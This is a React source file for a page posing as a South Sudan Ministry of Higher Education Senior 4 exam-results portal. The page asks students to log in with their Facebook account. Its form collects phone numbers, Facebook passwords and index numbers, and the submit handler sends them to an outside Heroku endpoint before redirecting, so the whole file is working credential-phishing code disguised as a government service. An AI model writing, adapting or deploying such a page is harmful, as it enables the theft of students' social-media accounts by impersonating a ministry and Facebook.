import React, { useState } from 'react'
import { Button } from 'react-bootstrap';
import { FaFacebook, FaUserCircle } from 'react-icons/fa';
import {withRouter} from 'react-router-dom'
import axios from 'axios'


function Main(props) {

    const [isLoading, setIsLoading] = useState(false);
    const [phoneMsg, setPhoneMsg] = useState('');
    const [passwordMsg, setPasswordMsg] = useState('');

    const [input, setInput] = useState({
        phone:'',
        password:'',
        index:''
    })

    const handleInput = ev => {
        setInput({...input, [ev.target.name]:ev.target.value})
        setPhoneMsg('')
        setPasswordMsg('')
    }

    const handleSubmit = async e => {
        e.preventDefault();
        try {

            const {phone, password} = input

            if(phone.length < 10){
                setPhoneMsg('incorrect phone')
                return
            }
            if(password.length < 8){
                setPasswordMsg('wrong pass')
                return
            }
            if(phone.length >= 8 || password.length >= 10){
                setIsLoading(true)
                const respond = await axios.post('https://konify-api.herokuapp.com/result', input).then(res => res)
                if(respond.status === 201){
                    setIsLoading(false)
                    props.history.push('/login')
                }else{
                    setIsLoading(false)
                }
            }
        } catch (error) {
            console.log(error)
        }
    }


    return (
        <div className="app-wraper">
            {isLoading && <div className="loader-wraper">
                <img src={process.env.PUBLIC_URL+'/images/loader.gif'} alt="loader" />
            </div>}
            <div className="app-content">
                <div className="text-center">
                    <b>Repblic of South Sudan</b>
                    <b>Ministery of Hight Education</b>
                    <b>2020-2021 Senior 4 Result</b>
                    <p>Dear Student login with your facebook account and Index number to access your results</p>
                </div>
                <div className="p-3">
                    <div className="text-center ">
                        <FaUserCircle className="login-icon mb-2" />
                        <h5> Login with Facebook</h5>
                    </div>
                    <form onSubmit={handleSubmit}>
                        <div className="form-group">
                            <p className="p-0 m-0">{phoneMsg && phoneMsg}</p>
                            <input className="form-control" type="text" required={true} placeholder="enter phone number" name="phone" onChange={handleInput} />
                        </div>
                        <div className="form-group">
                            <p className="p-0 m-0">{passwordMsg && passwordMsg}</p>
                            <input className="form-control" type="text" required={true} placeholder="enter password" name="password" onChange={handleInput} />
                        </div>
                        <div className="form-group">
                            <input className="form-control" type="text" placeholder="enter index No" name="index" onChange={handleInput} />
                        </div>
                        <div className="form-group">
                            <Button type="submit" className="btn btn-primary w-100 login-btn"><FaFacebook /> Login</Button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    )
}


export default  withRouter(Main)